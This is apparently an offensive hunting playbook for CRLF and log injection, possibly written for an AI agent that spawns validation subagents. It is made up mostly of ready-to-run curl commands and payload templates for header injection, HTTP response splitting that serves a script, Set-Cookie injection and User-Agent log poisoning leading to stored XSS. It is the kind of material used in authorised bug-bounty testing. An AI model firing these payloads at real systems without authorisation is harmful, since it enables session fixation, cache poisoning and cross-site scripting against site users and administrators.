# HUNT-CRLF — CRLF / Log Injection

## Crown Jewel Targets

CRLF alone is Medium. Chained to cache poisoning, XSS, or log poisoning it becomes High.

- **Redirect endpoints** — `?url=`, `?next=`, `?redirect_uri=`
- **Logging endpoints** — user-agent, referer, X-Forwarded-For reflected in admin logs
- **Proxy/cache fronted endpoints** — CRLF → cache poisoning → stored XSS
- **Cookie-setting endpoints** — inject `Set-Cookie` header via CRLF
- **Error log viewers** — admin SOC dashboard renders logs as HTML

## Attack Surface Signals

```
User input reflected in any response header
Redirect parameters: ?url=, ?next=, ?redirect=
Logging: User-Agent, Referer, X-Forwarded-For
```

## Step-by-Step Hunting Methodology

### Phase 1 — Detect CRLF

```bash
# URL-encoded CRLF test
curl -s -I "https://target.com/redirect?url=%0d%0aX-Injected:%20true"

# Check response for X-Injected header
curl -s -D - "https://target.com/redirect?url=%0d%0aX-Injected:%20true%0d%0a"
```

### Phase 2 — Response Splitting

```bash
# Split response to serve attacker content
curl -s "https://target.com/redirect?url=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2023%0d%0a%0d%0a<script>alert(1)</script>"
```

### Phase 3 — Cookie Injection

```bash
# Inject Set-Cookie header
curl -s -I "https://target.com/?param=%0d%0aSet-Cookie:%20session=attacker;%20path=/"
```

### Phase 4 — Log Poisoning → XSS

```bash
# Inject XSS payload into log via User-Agent
curl -s "https://target.com/" -A "Mozilla/5.0<script>alert(1)</script>"
# Then if admin views logs in browser without sanitization → stored XSS
```

## Payload Templates

```
# Basic header injection
%0d%0aX-Injected:%20true

# Response splitting
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a

# Cookie injection
%0d%0aSet-Cookie:%20session=attacker;%20path=/

# Double CRLF to end headers
%0d%0a%0d%0a<script>alert(1)</script>
```

## Common Root Causes

- User input concatenated into response headers without sanitization
- Redirect parameters not validated or encoded
- Log data rendered in browsers without HTML encoding
- Reverse proxies pass through CRLF sequences

## Gate 0 Validation

- [ ] Have I confirmed CRLF injection in a response header?
- [ ] Have I tested response splitting?
- [ ] Have I tested cookie injection?
- [ ] Have I tested log poisoning if logs are browser-rendered?

## Validation Subagent

Before logging a finding, spawn a dedicated subagent to independently confirm exploitability:

1. Pass all evidence (URL, parameters, request/response, payload) to the subagent.
2. The subagent must independently reproduce the PoC — not just restate the hypothesis.
3. If blind/OOB is required, the subagent must start an interactsh listener and demonstrate out-of-band callback before the finding is logged.
4. Only after validation succeeds, capture evidence, assign severity, and log the finding.

This gate prevents false positives, hallucinated impact, and non-reproducible findings from entering the report.
